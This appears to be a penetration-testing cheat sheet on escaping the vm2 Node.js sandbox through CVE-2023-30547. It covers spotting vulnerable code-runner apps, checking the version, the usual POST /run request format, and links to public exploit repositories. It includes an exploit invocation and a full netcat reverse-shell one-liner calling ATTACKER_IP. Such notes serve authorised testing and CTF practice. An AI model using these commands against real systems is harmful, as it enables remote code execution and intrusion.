# vm2 (Node.js sandbox)

**vm2** is a Node.js library used to sandbox user-supplied JavaScript. Sites may offer a "test your code" or "run code" feature that executes input inside vm2. Versions before **3.9.17** are vulnerable to sandbox escape and RCE.

**Detection:** Look for an app that runs user code (e.g. "Test your Node.js code", code editor, `/editor`, `/run`). The about/limitations page may mention vm2 or list restricted modules (`child_process`, `fs`). Check for a version link (e.g. `vm2/releases/tag/3.9.16`).

---

## Version check (in-sandbox)

If you can run code in the sandbox, check the vm2 version:

```javascript
const version = require("vm2/package.json").version;
console.log(version < "3.9.17" ? "vulnerable!" : "not vulnerable");
```

---

## CVE-2023-30547 / vm2 escape

**Affects:** vm2 before 3.9.17. Multiple escape techniques exist; public PoCs achieve RCE.

**Request format:** Many apps send the code as **base64** in JSON to an endpoint like `POST /run`:

```json
{"code":"<base64-encoded JavaScript>"}
```

**PoCs:**

* [rvizx/VM2-Exploit](https://github.com/rvizx/VM2-Exploit) — general vm2 escape.
* [rvizx/CVE-2023-30547](https://github.com/rvizx/CVE-2023-30547) — exploit script that sends payload to the target `/run` (or similar) endpoint.

```bash
# Exploit sends commands to the target; ensure the script uses the correct endpoint (e.g. /run)
python3 exploit.py http://TARGET/run
# Then at prompt: id, pwd, or reverse shell one-liner
```

**Reverse shell:** Run the exploit and at the `>` prompt send a reverse shell (e.g. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 9001 >/tmp/f`). Start listener: `nc -nlvp 9001`. Shell runs as the process user (e.g. `svc`).

---

## Quick reference

| Item | Value |
|------|--------|
| Vulnerable | vm2 &lt; 3.9.17 |
| Typical endpoint | `POST /run` with `{"code":"BASE64"}` |
| Version check | `require("vm2/package.json").version` |
| PoC | rvizx/CVE-2023-30547, rvizx/VM2-Exploit |
